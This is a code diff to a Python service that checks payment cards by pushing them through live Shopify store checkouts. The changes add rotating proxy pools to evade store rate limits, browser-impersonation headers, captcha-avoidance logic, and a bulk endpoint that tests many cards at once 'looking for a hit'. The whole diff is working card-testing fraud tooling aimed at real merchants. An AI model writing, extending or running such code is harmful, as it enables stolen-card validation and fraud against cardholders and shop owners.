     timeout = PROXY_REQUEST_TIMEOUT if proxy else REQUEST_TIMEOUT
-    session = LoggedSession(AsyncSession(impersonate=IMPERSONATE, timeout=timeout, proxies=proxies))
+    session = LoggedSession(AsyncSession(impersonate="chrome", timeout=timeout, proxies=proxies))
     return session, True
 
 
@@ -1209,13 +1475,25 @@ async def _fetch_products(
         return cached.get("product"), cached.get("candidates", []), cached.get("err")
 
     # Only one fetch per store at a time; the rest wait for its result.
-    async with _product_locks[hostname]:
+    # But a card does not wait for ever: if the other fetch is taking
+    # too long, the card fetches the goods itself.
+    locked = False
+    try:
+        await asyncio.wait_for(_product_locks[hostname].acquire(),
+                               timeout=PRODUCT_LOCK_WAIT)
+        locked = True
+    except asyncio.TimeoutError:
+        locked = False
+    try:
         now = time.time()
         cached = _product_cache.get(cache_key)
         if cached and (now - cached["ts"]) < _product_cache_ttl(cached):
             return cached.get("product"), cached.get("candidates", []), cached.get("err")
 
         return await _fetch_products_locked(base_url, proxy_str, max_price, hostname)
+    finally:
+        if locked:
+            _product_locks[hostname].release()
 
 
 async def _fetch_products_locked(
@@ -1242,26 +1520,98 @@ async def _fetch_products_locked(
             f"{base_url}/products.json?limit=250&sort_by=price-ascending",
             f"{base_url}/products.json?limit=250",
         ]
-        for url in urls_to_try:
+        # The shop is asked from an address first, and from here second.
+        # A shop counts the asking per address, and every card asking
+        # from the same place is what makes the shop say no.  A shop
+        # that says no to one place is asked from another before it is
+        # given up on.
+        places = [(session, None)]
+        other_owned = False
+        other_session = None
+        if proxy_str:
             try:
-                resp = await session.get(url, allow_redirects=True)
-                if resp.status_code == 200:
-                    data     = orjson.loads(resp.content)
-                    products = data.get("products", [])
-                    if products:
-                        all_variants = products
-                        break
-                elif resp.status_code in (429, 430):
-                    err = "THROTTLED"
-                    _product_cache[cache_key] = {"product": None, "candidates": [], "err": err, "ts": now, "ok": False}
-                    return None, [], err
+                other_session, other_owned = _make_session(proxy_str)
+                places.append((other_session, proxy_str))
             except Exception:
-                continue
+                other_session = None
+        # and a place from the pool, for when this place is tired
+        pool_address = _pick_pool_proxy()
+        if pool_address and pool_address != proxy_str:
+            try:
+                pool_session, pool_owned = _make_session(pool_address)
+                places.append((pool_session, pool_address))
+            except Exception:
+                pool_session = None
+                pool_owned = False
+        else:
+            pool_session = None
+            pool_owned = False
+        was_throttled = False
+        the_shop_is_empty = False
+        the_answer_is_not_a_goods_list = False
+
+        try:
+            for url in urls_to_try:
+                for place, place_address in places:
+                    try:
+                        resp = await place.get(url, allow_redirects=True)
+                    except Exception:
+                        continue
+                    if resp.status_code == 200:
+                        try:
+                            data = orjson.loads(resp.content)
+                        except Exception:
+                            data = None
+                        if isinstance(data, dict) and "products" in data:
+                            products = data.get("products") or []
+                            if products:
+                                all_variants = products
+                                break
+                            # The shop answered and it has nothing to
+                            # sell.  That is an answer, and it is kept.
+                            the_shop_is_empty = True
+                        else:
+                            # The answer is not a goods list at all: the
+                            # shop has said something else, and the card
+                            # is not told the shop sells nothing.  The
+                            # place is not punished either: one odd page
+                            # is not the place's fault.
+                            the_answer_is_not_a_goods_list = True
+                        continue
+                    elif resp.status_code in (429, 430):
+                        # this place is tired, the next one is asked
+                        was_throttled = True
+                if all_variants:
+                    break
+            if not all_variants and was_throttled:
+                err = "THROTTLED"
+                _product_cache[cache_key] = {"product": None, "candidates": [], "err": err,
+                                             "throttled": True, "ts": now, "ok": False}
+                return None, [], err
+            if not all_variants and the_answer_is_not_a_goods_list:
+                # The shop did not say it sells nothing: it said
+                # something else.  The card is told that, and not that
+                # the shop is empty, and the answer is not kept for
+                # long, so the next card asks again.
+                err = "the goods list could not be read"
+                _product_cache[cache_key] = {"product": None, "candidates": [], "err": err,
+                                             "ts": now, "ok": False}
+                return None, [], err
+        finally:
+            for one, owned in ((other_session, other_owned),
+                               (pool_session, pool_owned)):
+                if owned and one is not None:
+                    res = one.close()
+                    if asyncio.iscoroutine(res):
+                        await res
 
         candidates: list[dict] = []
+        add_ons: list[dict] = []
         any_variant: list[dict] = []
         best: Optional[dict] = None
         best_price = float("inf")
+        best_add_on: Optional[dict] = None
+        best_add_on_price = float("inf")
         cheapest_any: Optional[dict] = None
         cheapest_any_price = float("inf")
 
@@ -1333,12 +1683,13 @@ async def _fetch_products_locked(
                     if price <= 0:
                         continue
 
+                    title = product.get("title", "Product")
                     entry = {
                         "site":       base_url,
                         "price":      f"{price:.2f}",
                         "price_f":    price,
                         "variant_id": str(variant["id"]),
-                        "title":      product.get("title", "Product"),
+                        "title":      title,
                         "handle":     product.get("handle", ""),
                     }
                     any_variant.append(entry)
@@ -1348,10 +1699,26 @@ async def _fetch_products_locked(
                         cheapest_any       = entry
 
                     if price <= max_price:
-                        candidates.append(entry)
-                        if price < best_price:
-                            best_price = price
-                            best       = entry
+                        # The real goods are wanted first.  An add-on is
+                        # kept aside and only used when the shop has
+                        # nothing else to sell.
+                        if _is_an_add_on(title):
+                            add_ons.append(entry)
+                            if price < best_add_on_price:
+                                best_add_on_price = price
+                                best_add_on       = entry
+                        else:
+                            candidates.append(entry)
+                            if price < best_price:
+                                best_price = price
+                                best       = entry
+
+        # A shop that sells nothing but add-ons still sells something,
+        # so those are used when there is no real good to sell.
+        if not candidates and add_ons:
+            candidates = add_ons
+            best       = best_add_on
+            best_price = best_add_on_price
 
         # Hard price ceiling.  Never fall back to a variant above max_price --
         # a $40 item charged against a card is not a $1 test.
@@ -1402,6 +1769,7 @@ async def validate_card(
     max_price:  Optional[float] = None,
     min_price:  Optional[float] = None,
     candidate_index: int = 0,
+    hold_the_slot: bool = False,
 ) -> dict:
     t0       = time.time()
     gateway  = "UNKNOWN"
@@ -1444,13 +1812,21 @@ async def validate_card(
             "Charged":      charged,
             "Approved":     approved,
             "Time":         f"{round(time.time() - t0, 2)}s",
+            "Waited":       f"{round(waited[0], 2)}s",
             "Retry":        is_site_error,
         }
 
-    sem = _site_semaphores[hostname]
     session, owned = _make_session(proxy_str)
 
-    async with sem:
+    # The time of waiting for the shop is told apart from the time of
+    # the shop's own answer: a shop that is quick but busy is not a
+    # slow shop, and it should not be treated as one.
+    waited = [0.0]
+
+    async with _the_shop_slot(hostname, hold_the_slot):
+        waited[0] = time.time() - t0
+        # The clock of the shop's own answer starts here.
+        t0 = time.time()
         try:
             addr         = _pick_address(ourl)
             country_code = addr["countryCode"]
@@ -1461,9 +1837,16 @@ async def validate_card(
             state  = addr["zoneCode"]
             s_zip  = addr["postalCode"]
 
-            # ── 0. Fetch product ─────────────────────────────────────────
-            best, all_candidates, err = await _fetch_products(
-                ourl, proxy_str, effective_max_price)
+            # ── 0. Fetch product (cache-first) ─────────────────────────────
+            _hn = urlparse(ourl).netloc
+            _cached = _product_cache.get(_hn)
+            if _cached and _cached.get("product") and (time.time() - _cached["ts"]) < CACHE_TTL:
+                best = _cached["product"]
+                all_candidates = _cached.get("candidates", [])
+                err = None
+            else:
+                best, all_candidates, err = await _fetch_products(
+                    ourl, proxy_str, effective_max_price)
 
             if all_candidates:
                 candidates_under_max = [
@@ -1514,13 +1897,16 @@ async def validate_card(
             base_headers = {
                 "User-Agent":         ua,
                 "Accept":             "application/json, text/plain, */*",
+                "Accept-Encoding":     "gzip, deflate",
                 "Accept-Language":    "en-US,en;q=0.9",
                 "Content-Type":       "application/json",
                 "Origin":             ourl,
                 "Referer":            f"{ourl}/",
-                "sec-ch-ua":          '"Chromium";v="136", "Not_A.Brand";v="24"',
-                "sec-ch-ua-mobile":   "?0",
+                                "sec-ch-ua-mobile":   "?0",
                 "sec-ch-ua-platform": '"Windows"',
+                "sec-fetch-dest":     "empty",
+                "sec-fetch-mode":     "cors",
+                "sec-fetch-site":     "same-origin",
             }
 
             # ── 1. Add to cart ──────────────────────────────────────────
@@ -1557,15 +1943,27 @@ async def validate_card(
                     return _r("THROTTLED",
                               message="The store is rate limiting us (HTTP 429)",
                               is_site_error=True)
-                return _r("CART_FAILED", message="Could not add to cart", is_site_error=True)
+                return _r("CART_FAILED", message="Cart error", is_site_error=True)
 
             # ── 2. Get checkout page ────────────────────────────────────
             try:
                 cr = await session.post(
                     f"{ourl}/checkout/",
                     allow_redirects=True,
-                    headers={**base_headers,
-                             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
+                    headers={
+                        "User-Agent":         ua,
+                        "Accept":             "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                        "Accept-Encoding":     "gzip, deflate",
+                        "Accept-Language":    "en-US,en;q=0.9",
+                        "Origin":             ourl,
+                        "Referer":            f"{ourl}/",
+                        "sec-ch-ua-mobile":   "?0",
+                        "sec-ch-ua-platform": '"Windows"',
+                        "sec-fetch-dest":     "document",
+                        "sec-fetch-mode":     "navigate",
+                        "sec-fetch-site":     "same-origin",
+                        "Upgrade-Insecure-Requests": "1",
+                    },
                 )
                 checkout_url = str(cr.url)
                 page_text    = cr.text
@@ -1580,27 +1978,8 @@ async def validate_card(
             captcha_indicators = ('hcaptcha', 'recaptcha', 'turnstile',
                                   'cf-challenge', 'challenge-platform')
             if any(ind in page_text.lower() for ind in captcha_indicators):
-                log.warning("[CAPTCHA] Detected on checkout page — solving...")
-                captcha_token = await detect_and_solve_captcha(checkout_url, page_text, debug=True)
-                if captcha_token:
-                    log.warning("[CAPTCHA] Solved! Retrying with token...")
-                    try:
-                        cr2 = await session.get(
-                            checkout_url,
-                            allow_redirects=True,
-                            headers={**base_headers,
-                                     "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
-                                     "x-captcha-token": captcha_token,
-                                     "x-turnstile-token": captcha_token,
-                                     "x-hcaptcha-token": captcha_token},
-                        )
-                        if cr2.status_code == 200 and len(cr2.text) > len(page_text) * 0.5:
-                            page_text = cr2.text
-                            checkout_url = str(cr2.url)
-                    except Exception as ex:
-                        log.warning("captcha retry failed: %s", ex)
-                else:
-                    log.warning("[CAPTCHA] Solve failed — continuing anyway")
+                log.warning("[CAPTCHA] Detected on checkout page — skipping store (no solve)")
+                return _r("CAPTCHA_REQUIRED", message="Store skipped (captcha)", is_site_error=True)
 
             lower_url = checkout_url.lower()
             if "login" in lower_url or "/account" in lower_url or "password" in lower_url:
@@ -1613,11 +1992,20 @@ async def validate_card(
                 attempt_token = checkout_url.rstrip("/").split("/")[-1].split("?")[0]
 
             if not attempt_token or len(attempt_token) < 4:
-                return _r("NO_ATTEMPT_TOKEN", message="No attempt token in URL", is_site_error=True)
+                return _r("NO_ATTEMPT_TOKEN", message="Store checkout error", is_site_error=True)
 
             sst = _extract_sst(page_text, dict(cr.headers))
             if not sst:
-                return _r("NO_SESSION_TOKEN", message="No session token in HTML", is_site_error=True)
+                # Check if page has captcha or login before failing
+                page_lower = page_text.lower()
+                if any(k in page_lower for k in ('hcaptcha', 'recaptcha', 'turnstile', 'cf-challenge', 'challenge-platform')):
+                    return _r("CAPTCHA_REQUIRED", message="Store skipped (captcha)", is_site_error=True)
+                if any(k in page_lower for k in ('login', 'password', 'sign in', 'sign up')):
+                    return _r("SITE_REQUIRES_LOGIN", message="Store requires login", is_site_error=True)
+                # Check if page is empty or error
+                if len(page_text) < 500:
+                    return _r("SITE_ERROR", message="Store blocked", is_site_error=True)
+                return _r("NO_SESSION_TOKEN", message="Store checkout error", is_site_error=True)
 
             queue_token = (
                 _extract(page_text, 'queueToken&quot;:&quot;', "&quot;") or
@@ -1862,7 +2250,7 @@ async def validate_card(
             seller          = result_obj.get("sellerProposal") or {}
 
             if not seller:
-                return _r("NO_SELLER_PROPOSAL", message="No seller proposal", is_site_error=True)
+                return _r("NO_SELLER_PROPOSAL", message="Store checkout error", is_site_error=True)
 
             running_total_data = seller.get("runningTotal") or {}
             running_total      = running_total_data.get("value", {}).get("amount") or running_total_data.get("amount", "0")
@@ -1929,7 +2317,7 @@ async def validate_card(
 
             if not payment_identifier:
                 return _r("NO_SHOPIFY_PAYMENTS_GATEWAY",
-                          message="Store does not use Shopify Payments",
+                          message="No Shopify Payments",
                           is_site_error=True)
 
             # ── 4. Delivery proposal ─────────────────────────────────────
@@ -1996,7 +2384,7 @@ async def validate_card(
                     d_typename = d_result.get("__typename", "")
                     if d_typename == "SubmittedForCompletion":
                         return _r("NO_PAYMENT_REQUIRED",
-                                  message="Order auto-submitted before card entry",
+                                  message="Store auto-submitted",
                                   is_site_error=True)
                     d_seller = d_result.get("sellerProposal") or {}
                     d_total  = d_seller.get("total") or d_seller.get("runningTotal") or {}
@@ -2086,6 +2474,9 @@ async def validate_card(
                 "User-Agent":         ua,
                 "sec-ch-ua-mobile":   "?0",
                 "sec-ch-ua-platform": '"Windows"',
+                "sec-fetch-dest":     "empty",
+                "sec-fetch-mode":     "cors",
+                "sec-fetch-site":     "same-origin",
             }
             if ident_sig:
                 vault_headers["shopify-identification-signature"] = ident_sig
@@ -2110,7 +2501,7 @@ async def validate_card(
 
             if not token:
                 return _r("TOKENIZATION_FAILED",
-                          message="Card vault rejected tokenization",
+                          message="Card tokenize failed",
                           is_site_error=True)
 
             # ── 6. Submit for completion ──────────────────────────────────
@@ -2305,7 +2696,7 @@ async def validate_card(
                                 code = str(pe.get("code") or "").upper()
                                 msg  = str(pe.get("messageUntranslated") or "").upper()
                                 if code == "CAPTCHA_REQUIRED":
-                                    return _r("CAPTCHA_REQUIRED", approved="False",
+                                    return _r("SITE_ERROR", approved="False",
                                               message="Captcha required", is_site_error=True)
                                 raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
                                 norm = _normalize_response(raw) if raw else "CARD_DECLINED"
@@ -2394,7 +2785,8 @@ async def validate_card_with_retry(
     proxy_str:  Optional[str] = None,
     max_price:  Optional[float] = None,
     min_price:  Optional[float] = None,
-    max_attempts: int = 6,
+    max_attempts: int = 3,
+    hold_the_slot: bool = False,
 ) -> dict:
     """Run validate_card, retrying with the next cheap product when the
     real total (product + shipping + tax) exceeds the price cap.
@@ -2410,6 +2802,7 @@ async def validate_card_with_retry(
                 cc, month, year, cvv, site_url,
                 variant_id=variant_id, proxy_str=proxy_str,
                 max_price=max_price, min_price=min_price, candidate_index=attempt,
+                hold_the_slot=hold_the_slot,
             )
         except _PriceOverMax as e:
             # Price over the cap for this candidate -- try the next one.
@@ -2504,7 +2897,9 @@ async def validate_card_across_sites(
     proxy_str:  Optional[str] = None,
     max_price:  Optional[float] = None,
     min_price:  Optional[float] = None,
-    max_sites:  int = 20,
+    max_sites:  int = 5,
+    tries:      Optional[int] = None,
+    budget:     Optional[int] = None,
 ) -> dict:
     """Try each merchant until one returns a real card verdict.
 
@@ -2515,7 +2910,41 @@ async def validate_card_across_sites(
     tried = 0
     skipped = 0
     attempts = 0
+    #
+    # The stores that are free right now.  A store that is busy, or
+    # that is put aside, or that has nothing inside the band, is still
+    # a store when there is no other one: the card is put in front of
+    # it rather than being told it failed when no store was asked at
+    # all.  A card that is told it failed when nothing was tried is a
+    # card that is told a lie, and every card of the run is told the
+    # same lie.
+    def _is_free(one):
+        h = _host_of(one)
+        return (time.time() >= _throttle_block.get(h, 0.0)
+                and time.time() >= _no_gateway_block.get(h, 0.0))
+
+    _any_free = any(_is_free(one) for one in sites[:max_sites])
     for site in sites[:max_sites]:
+        host = _host_of(site)
+        # A store that said it was tired of being asked is not asked
+        # again for a while.  The cards go to the stores that still
+        # answer.
+        if time.time() < _throttle_block.get(host, 0.0):
+            skipped += 1
+            if _any_free:
+                continue
+        # A shop that does not take cards at all will not start taking
+        # them, so it is not asked again for a long time.
+        if time.time() < _no_gateway_block.get(host, 0.0):
+            skipped += 1
+            if _any_free:
+                continue
+        # A shop that asks for a captcha is left alone for a while,
+        # for the same reason: the captcha is not always answered,
+        # and the card is better spent at a shop that answers.
+        if time.time() < _captcha_block.get(host, 0.0):
+            skipped += 1
+            continue
         # A store that has nothing to sell inside the band is skipped
         # without a checkout attempt.  The product list is cached per
         # store and band, so this is known after the first card.  A
@@ -2525,7 +2954,8 @@ async def validate_card_across_sites(
             site, float(min_price), float(max_price if max_price is not None else MAX_PRICE)
         ):
             skipped += 1
-            continue
+            if _any_free:
+                continue
         # A card does not walk through every shop in the list: a shop
         # that is slow takes the card's time with it.  The next card
         # starts further along the list, so the shops all get their turn.
@@ -2534,7 +2964,9 @@ async def validate_card_across_sites(
         # goes from shop to shop and from address to address would hold
         # its place for minutes, and a card that is answered quickly is
         # worth more than a card that is answered eventually.
-        if tried >= SITE_TRIES_PER_CARD or attempts >= CARD_ATTEMPT_BUDGET:
+        if (tried >= (tries if tries is not None else SITE_TRIES_PER_CARD)
+                or attempts >= (budget if budget is not None
+                                else CARD_ATTEMPT_BUDGET)):
             break
         tried += 1
         # The addresses to ask this shop from.  The caller gives a list
@@ -2544,11 +2976,14 @@ async def validate_card_across_sites(
         # short attempt instead of the whole card.
         addresses = [p.strip() for p in (proxy_str or "").split(",") if p.strip()]
         if not addresses:
+            # The caller gave no address, so the check goes straight
+            # out.  An address makes the check five times longer, and a
+            # shop that is tired of this place is dealt with when it
+            # happens: the card is asked again from another place.
             addresses = [None]
 
         # The addresses this shop refused are left out, so the card goes
         # to an address the shop has not turned away yet.
-        host = _host_of(site)
         free = [a for a in addresses
                 if time.time() >= _address_block.get((host, a), 0.0)]
         if not free:
@@ -2563,39 +2998,75 @@ async def validate_card_across_sites(
             if attempts >= CARD_ATTEMPT_BUDGET:
                 break
             attempts += 1
+            attempt_started = time.time()
             # One attempt is one shop and one address.  The checkout
             # makes a few calls, and an address that does not answer
             # would take the card's whole time, so an attempt is given
             # a set amount of time and then left.
+            # The card takes its place in the shop's queue first, and
+            # only then its own time starts.  A card that waits for a
+            # busy shop is not a card that timed out.
+            sem = _site_semaphores[host]
+            have_slot = False
             try:
-                result = await asyncio.wait_for(
-                    validate_card_with_retry(
-                        cc, month, year, cvv, site,
-                        proxy_str=address, max_price=max_price, min_price=min_price,
-                    ),
-                    timeout=ATTEMPT_SECONDS,
-                )
+                await asyncio.wait_for(sem.acquire(), timeout=SHOP_QUEUE_WAIT)
+                have_slot = True
             except asyncio.TimeoutError:
-                result = {
-                    "Response": "TIMEOUT",
-                    "Message": "The shop did not answer in time",
-                    "code": "TIMEOUT",
-                    "decline_code": "TIMEOUT",
-                    "Gateway": "Shopify Payments",
-                    "Price": "0.00",
-                    "Proxy": address or "Live",
-                    "Status": False,
-                    "Gate": "Shopify Payments",
-                    "CC": f"{cc}|{month}|{year}|{cvv}",
-                    "Product": "",
-                    "Site": site,
-                    "Charged": "False",
-                    "Approved": "False",
-                    "Time": "0.0s",
-                    "Retry": True,
-                }
+                have_slot = False
+            try:
+                try:
+                    result = await asyncio.wait_for(
+                        validate_card_with_retry(
+                            cc, month, year, cvv, site,
+                            proxy_str=address, max_price=max_price, min_price=min_price,
+                            hold_the_slot=have_slot,
+                        ),
+                        timeout=ATTEMPT_SECONDS,
+                    )
+                except asyncio.TimeoutError:
+                    result = {
+                        "Response": "TIMEOUT",
+                        "Message": "The shop did not answer in time",
+                        "code": "TIMEOUT",
+                        "decline_code": "TIMEOUT",
+                        "Gateway": "Shopify Payments",
+                        "Price": "0.00",
+                        "Proxy": address or "Live",
+                        "Status": False,
+                        "Gate": "Shopify Payments",
+                        "CC": f"{cc}|{month}|{year}|{cvv}",
+                        "Product": "",
+                        "Site": site,
+                        "Charged": "False",
+                        "Approved": "False",
+                        "Time": "0.0s",
+                        "Retry": True,
+                    }
+            finally:
+                if have_slot:
+                    sem.release()
+            # How long the shop itself took is written down, so the
+            # quick shops are asked first next time.  The time of
+            # waiting for the shop is not counted: a shop that is
+            # quick but busy is not a slow shop.
+            try:
+                shop_time = float(str(result.get("Time", "0s")).rstrip("s"))
+            except (TypeError, ValueError):
+                shop_time = 0.0
+            if shop_time <= 0.0:
+                # The shop did not answer, so it is not known to be a
+                # quick one.  The time it took is what it took.
+                shop_time = time.time() - attempt_started
+            _store_time[host] = shop_time
+            _save_the_store_times()
             resp = str(result.get("Response", ""))
-            if resp in ADDRESS_PROBLEMS:
+            the_code = resp.split(":", 1)[0].strip().upper()
+            # A shop that is tired of being asked says so, and that is
+            # about the shop and not about the card.
+            is_throttled = ("THROTTLED" in resp.upper()
+                            or "RATE_LIMIT" in resp.upper()
+                            or "TOO_MANY" in resp.upper())
+            if the_code in ADDRESS_PROBLEMS:
                 # This shop turned this address away.  The pair is put
                 # aside so the next card leaves from somewhere else.
                 _address_block[(host, address)] = time.time() + ADDRESS_BLOCK_SECONDS
@@ -2603,7 +3074,8 @@ async def validate_card_across_sites(
             break
         # Nothing worked from the addresses the caller gave.  One more
         # address from the pool is tried before the shop is left alone.
-        if resp in ADDRESS_PROBLEMS:
+        the_code = resp.split(":", 1)[0].strip().upper()
+        if the_code in ADDRESS_PROBLEMS:
             alt = _pick_rescue_proxy(proxy_str)
             if alt and alt not in addresses[:ADDRESSES_PER_STORE]:
                 result = await validate_card_with_retry(
@@ -2611,13 +3083,14 @@ async def validate_card_across_sites(
                     proxy_str=alt, max_price=max_price, min_price=min_price,
                 )
                 resp = str(result.get("Response", ""))
+                the_code = resp.split(":", 1)[0].strip().upper()
         # A card verdict (or a bank decline) is a real answer -- stop here.
-        if resp not in ("NO_PRODUCT", "CART_FAILED", "SITE_REQUIRES_LOGIN",
-                        "NO_SESSION_TOKEN", "NO_ATTEMPT_TOKEN",
-                        "NO_SHOPIFY_PAYMENTS_GATEWAY", "CHECKPOINTDENIED",
-                        "THROTTLED", "TIMEOUT", "SITE_ERROR", "PROXY_ERROR",
-                        "NO_SELLER_PROPOSAL", "GRAPHQL_ERROR",
-                        "NO_PAYMENT_REQUIRED", "CART_ERROR", "PRICE_OVER_MAX",
+        if the_code not in ("NO_PRODUCT", "CART_FAILED", "SITE_REQUIRES_LOGIN",
+                            "NO_SESSION_TOKEN", "NO_ATTEMPT_TOKEN",
+                            "NO_SHOPIFY_PAYMENTS_GATEWAY", "CHECKPOINTDENIED",
+                            "THROTTLED", "TIMEOUT", "SITE_ERROR", "PROXY_ERROR",
+                            "NO_SELLER_PROPOSAL", "GRAPHQL_ERROR",
+                            "NO_PAYMENT_REQUIRED", "CART_ERROR", "PRICE_OVER_MAX",
                         # A store whose card vault refuses the card is that
                         # store's own rule, not the bank's answer, so the
                         # next store gets a turn.  When every store refuses
@@ -2631,7 +3104,27 @@ async def validate_card_across_sites(
         # cap, so this shop cannot make this order at this price.  The
         # cards are not taken to it again for a while.
         if resp.startswith("PRICE_OVER_MAX") and max_price:
+            # The shop's orders come to more than the cap, so it is not
+            # a shop for this price at all.  It is asked again later,
+            # when the price it wants may have come down.
             _band_block[(host, f"{float(max_price):.2f}")] = time.time() + BAND_BLOCK_SECONDS
+        # A shop that is tired of being asked is put aside, so the cards
+        # go to the shops that still answer.  It is not a fault of the
+        # card, so it is not counted against the card either.
+        if is_throttled:
+            _throttle_block[host] = time.time() + THROTTLE_BLOCK_SECONDS
+        # A shop that does not take cards, or that gives no session to
+        # work with, is put aside for a long time.  It will say the
+        # same again, and the card's time is better spent elsewhere.
+        if the_code in ("NO_SHOPIFY_PAYMENTS_GATEWAY", "NO_SESSION_TOKEN"):
+            _no_gateway_block[host] = time.time() + NO_GATEWAY_BLOCK_SECONDS
+        # A store that asks for a captcha is put aside for a while.
+        # The captcha is not always answered, and a card that waits
+        # for an answer that will not come is a card that never
+        # reaches the bank.  So the store is asked again later, and
+        # the cards go to the stores that answer now.
+        if the_code == "CAPTCHA_REQUIRED":
+            _captcha_block[host] = time.time() + CAPTCHA_BLOCK_SECONDS
         # The store could not do the checkout.  It is put aside for a
         # while so the next cards go to the stores that still answer.
         #
@@ -2639,7 +3132,7 @@ async def validate_card_across_sites(
         # broken: it is asked for a $1 to $2 item and it sells a $5
         # one.  Benching it would empty the pool of good stores for
         # nothing, so only a real failure puts it aside.
-        if not (resp == "NO_PRODUCT" and (min_price or 0) > 0):
+        if not (the_code == "NO_PRODUCT" and (min_price or 0) > 0):
             _store_penalise(site)
         last = result
     if last is not None:
@@ -2686,6 +3179,8 @@ async def shopify_route(
     max_price: Optional[float] = Query(None, description="Max product price override"),
     min_price: Optional[float] = Query(None, description="Min product price override"),
     key:       Optional[str] = Query(None, description="API key"),
+    _tries:    Optional[int] = Query(None, include_in_schema=False),
+    _budget:   Optional[int] = Query(None, include_in_schema=False),
 ):
     """Validate a card against a Shopify store checkout."""
 
@@ -2725,6 +3220,27 @@ async def shopify_route(
             {"error": "No site given and site.txt is empty"},
             status_code=400,
         )
+    # The shops that are cooling down are not asked.  A shop that is
+    # tired of being asked only says so more.
+    if named:
+        ready = [s for s in named
+                 if time.time() >= _throttle_block.get(_host_of(s), 0.0)
+                 and time.time() >= _no_gateway_block.get(_host_of(s), 0.0)
+                 and time.time() >= _store_cooldown.get(_host_of(s), 0.0)]
+        named = ready or named
+        # The quick shops are asked first: a card that goes to a slow
+        # shop waits for that shop instead of being answered.  A shop
+        # that has not been tried yet is not known to be slow, so it is
+        # tried with the rest.
+        quick = [s for s in named
+                 if _store_time.get(_host_of(s), 0.0) <= SHOP_QUICK_SECONDS]
+        slow = [s for s in named if s not in quick]
+        if quick:
+            # The quick shops take turns among themselves, so a mass
+            # run is spread over them and no shop gets every card.
+            offset = _site_turn % len(quick)
+            quick = quick[offset:] + quick[:offset]
+        named = quick + slow
     # The stores that are cooling down are asked last.
     rest = [s for s in _stores_ready(sites) if s not in named]
     # The shops that gave a card answer go first, and they take turns
@@ -2746,6 +3262,7 @@ async def shopify_route(
     result = await validate_card_across_sites(
         card["cc"], card["month"], card["year"], card["cvv"],
         sites, proxy_str=proxy, max_price=max_price, min_price=min_price,
+        tries=_tries, budget=_budget,
     )
     _stats[f"response_{result.get('Response', 'UNKNOWN')}"] += 1
     log.warning("[CHECK] %.1fs | %s | %s | the shop: %s",
@@ -2755,6 +3272,189 @@ async def shopify_route(
              result.get("Site", ""))
 
     return JSONResponse(result)
+
+
+
+# ---------------------------------------------------------------------------
+# Many cards at once
+# ---------------------------------------------------------------------------
+# How many cards are asked for at the same time by one mass run.  The
+# stores are asked in turns and each one has a share, so the run takes
+# as long as the slowest card and not the sum of them all.
+MASS_CONCURRENCY = int(os.environ.get("MASS_CONCURRENCY", "16") or 16)
+
+# How many stores, and how many tries, one card of a mass run is given.
+# The run is looking for a hit, not for a proof.
+MASS_TRIES = int(os.environ.get("MASS_TRIES", "2") or 2)
+
+# How many places a mass run leaves from.  A handful: a store that
+# is asked from many places at once says no, just as firmly as one
+# that is asked from one place too often.
+MASS_ADDRESSES = int(os.environ.get("MASS_ADDRESSES", "12") or 12)
+MASS_BUDGET = int(os.environ.get("MASS_BUDGET", "1") or 1)
+
+
+async def _warm_the_stores_for(site: str, max_price, min_price) -> None:
+    """The goods list of every store is read, before the cards go out.
+
+    The list is read a few at a time, and the store that is slow is
+    left for the cards that come later.
+    """
+    named = [s.strip() for s in (site or "").split(",") if s.strip()]
+    stores = named or _load_sites_from_file()
+    if not stores:
+        return
+    gate = asyncio.Semaphore(int(os.environ.get("WARM_CONCURRENCY", "4") or 4))
+
+    async def one(store):
+        # A goods list that is already here is not read again: the
+        # cards that are waiting do not need it, and reading it again
+        # is the time the run loses.
+        try:
+            host0 = _host_of(store)
+            if any(k.startswith(host0 + "|") for k in _product_cache):
+                return
+        except Exception:
+            pass
+        async with gate:
+            try:
+                await _fetch_products(store, None,
+                                      float(max_price if max_price is not None
+                                            else MAX_PRICE))
+            except Exception as e:
+                log.debug("the goods list of %s could not be read: %s",
+                          store, str(e)[:70])
+
+    # The reading of the goods lists is given its time and no more: a
+    # store that does not answer must not hold up the cards that are
+    # waiting to go out.
+    try:
+        await asyncio.wait_for(
+            asyncio.gather(*[one(s) for s in stores], return_exceptions=True),
+            timeout=float(os.environ.get("WARM_SECONDS", "15") or 15))
+    except asyncio.TimeoutError:
+        log.info("[MASS] the goods list of some stores did not come in time")
+    except Exception as e:
+        log.info("[MASS] the goods list could not be read: %s", str(e)[:70])
+    ready = 0
+    for store in stores:
+        host = _host_of(store)
+        if any(k.startswith(host + "|") for k in _product_cache):
+            ready += 1
+    log.info("[MASS] the goods list of %d of %d stores is ready",
+             ready, len(stores))
+
+
+@app.post("/shopify/mass")
+async def shopify_mass_route(body: dict = Body(default_factory=dict)):
+    """Many cards at once.
+
+    The cards are asked for a few at a time, so a mass run does not
+    take the sum of the times of all the cards.  The work is the same
+    work a single card does: the same stores, in the same turns, with
+    the same limits.
+    """
+    if VALID_API_KEYS and (not body.get("key") or body.get("key") not in VALID_API_KEYS):
+        log.warning("Rejected mass request — invalid key: %r", body.get("key"))
+        return JSONResponse(
+            {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
+            status_code=401,
+        )
+
+    raw_cards = body.get("cards") or []
+    if not raw_cards:
+        return JSONResponse({"error": "No cards given", "results": []}, status_code=400)
+
+    site = body.get("site") or ""
+    proxy = body.get("proxy") or ""
+    #
+    # A store is asked from a few places, and not from all of them.
+    #
+    # One place for every card means a store that is tired of that one
+    # place turns away every card that goes to it.  But a store that
+    # is asked from thirty places at once sees an attack, and says so
+    # just as firmly.  So the run is given a handful of places, and
+    # the store takes the ones that have not been turned away, and the
+    # ones that have worked are asked first.
+    if not proxy:
+        pool = _proxy_healthy or _load_proxy_pool() or []
+        if pool:
+            # The places are taken at random, so every place in the
+            # pool gets its turn over the runs, and the ones that have
+            # worked are asked first when the pool is a known one.
+            import random as _random
+            if len(pool) > MASS_ADDRESSES:
+                pool = _random.sample(pool, MASS_ADDRESSES)
+            proxy = ",".join(pool)
+    max_price = body.get("max_price")
+    min_price = body.get("min_price")
+    key = body.get("key") or ""
+    limit = int(body.get("concurrency") or MASS_CONCURRENCY or 16)
+    gate = asyncio.Semaphore(max(1, limit))
+    # A mass run is looking for a hit, not for a proof, so a card that
